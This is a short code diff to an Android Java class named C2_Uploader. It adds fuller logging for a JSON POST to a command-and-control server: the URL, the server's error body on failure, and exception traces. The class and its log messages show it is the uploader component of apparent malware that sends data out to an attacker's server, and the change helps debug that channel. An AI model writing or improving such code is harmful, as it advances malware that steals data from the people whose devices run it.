@@ -83,9 +83,19 @@ public class C2_Uploader {
             }
 
             int code = conn.getResponseCode();
-            Log.d(TAG, "C2 JSON POST Response: " + code);
+            Log.d(TAG, "C2 JSON POST Response Code: " + code + " to URL: " + urlString);
+            if (code >= 400) {
+                try (BufferedReader br = new BufferedReader(new InputStreamReader(conn.getErrorStream(), StandardCharsets.UTF_8))) {
+                    StringBuilder responseBody = new StringBuilder();
+                    String responseLine;
+                    while ((responseLine = br.readLine()) != null) {
+                        responseBody.append(responseLine.trim());
+                    }
+                    Log.e(TAG, "C2 Server Error Response: " + responseBody.toString());
+                } catch (Exception ignored) {}
+            }
         } catch (Exception e) {
-            Log.e(TAG, "C2 POST Error: " + e.getMessage());
+            Log.e(TAG, "C2 POST Error: " + e.getMessage(), e);
         } finally {
             if (conn != null) conn.disconnect();
         }
